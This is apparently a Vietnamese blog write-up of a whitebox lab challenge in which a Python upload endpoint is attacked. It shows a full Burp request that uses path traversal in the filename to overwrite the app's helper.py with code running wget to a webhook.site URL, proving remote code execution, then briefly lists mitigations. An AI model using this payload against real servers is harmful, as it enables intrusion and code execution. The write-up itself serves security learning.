+++
date = '2025-12-28T18:01:01+07:00'
draft = false
title = 'File Upload Challenge'
image = 'cover.jpg'
categories = ["Security", "File uploads vulnerabilities"]
+++
# Báo cáo Task 4.1: File upload

## Challenge lab whitebox

> http://113.171.248.61:8008/
> Source code đính kèm

Ta được cung cấp một source code Python, định nghĩa một endpoint `/uploader` cho phép user upload thông qua method POST. Dựa vào những gì đề bài cho, ta chỉ có thể upload một file để tấn công

## Phân tích challenge

Đáng chú ý nhất trong source code là đoạn này

```python
file_path = os.path.join(UPLOAD_FOLDER, f.filename)
print(file_path)
f.save(file_path)

try:
    from utils import helper
    helper.rename_file(file_path, os.path.join(UPLOAD_FOLDER, str(session['num_file']) + '.txt'))
except Exception as e:
    return f"Lỗi xử lý file: {e}"
```

Trong đó sử dụng `os.path.join()`, developer đã truyền trực tiếp `f.filename` của người dùng vào thẳng `UPLOAD_FOLDER`. Từ đây, ta biết chắc chắn có thể tấn công Path Traversal. Chỉ bằng cách thay đổi tên của `f.filename`

Ngoài ra, trong challenge này, có lẽ hàm `f.save()` mặc định sẽ replace file đang có bằng file mới cùng tên (file của attacker gửi lên).

Khi đọc kĩ source, ta sẽ thấy developer có viết thêm một file tên là `helper.py` trong thư mục `../utils`, trong file này có hàm `rename_file`. Giờ ta sẽ viết lại file `helper.py` để ghi đè hàm `rename_file` gọi về webhook của ta

## Tấn công thử

Kết hợp Path Traversal và File Upload theo như phân tích ta đã biết ở trên kia, dưới đây là Request gửi từ Burp Suite

```
POST /uploader HTTP/1.1
Host: 113.171.248.61:8008
Content-Length: 622
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://113.171.248.61:8008
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykggKjwOlZ9TcAUwi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://113.171.248.61:8008/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJudW1fZmlsZSI6MX0.aCQ98Q.3YlntWqlPEEqwf5vIut5BBSCAts
Connection: keep-alive

------WebKitFormBoundarykggKjwOlZ9TcAUwi
Content-Disposition: form-data; name="files"; filename="../utils/helper.py"
Content-Type: text/plain

import os

def rename_file(a, b):
    try:
        # Try wget as an alternative to curl
        os.system("wget -qO- https://webhook.site/a4a258a3-5789-48a7-a1b3-64a1b4e78ab9")
        # Try using ping as a fallback method to trigger the webhook
        os.system("ping -c 1 webhook.site")
        print("Webhook attempt made via wget and ping")
    except Exception as e:
        print(f"Error calling webhook: {e}")

------WebKitFormBoundarykggKjwOlZ9TcAUwi--
```

với header dưới đây để ghi đè file `helper.py` sử dụng Path Traversal.
```
Content-Disposition: form-data; name="files"; filename="../utils/helper.py"
```

Và khi thử lại với webhook, ta thấy đã thành công gửi request về webhook của ta
![image](https://hackmd.io/_uploads/HJKZXTWbxe.png)

## Tổng kết

Vậy khi đã có thể call tới webhook rồi, ta cũng có thể RCE, leo quyền hệ thống, ...

Để ngăn chặn lỗ hổng này, ta có thể áp dụng: check tên file, loại file, chỉ định thư mục upload cụ thể, container hoá app, v.v...

## Tham khảo

https://samy.blog/rtfm/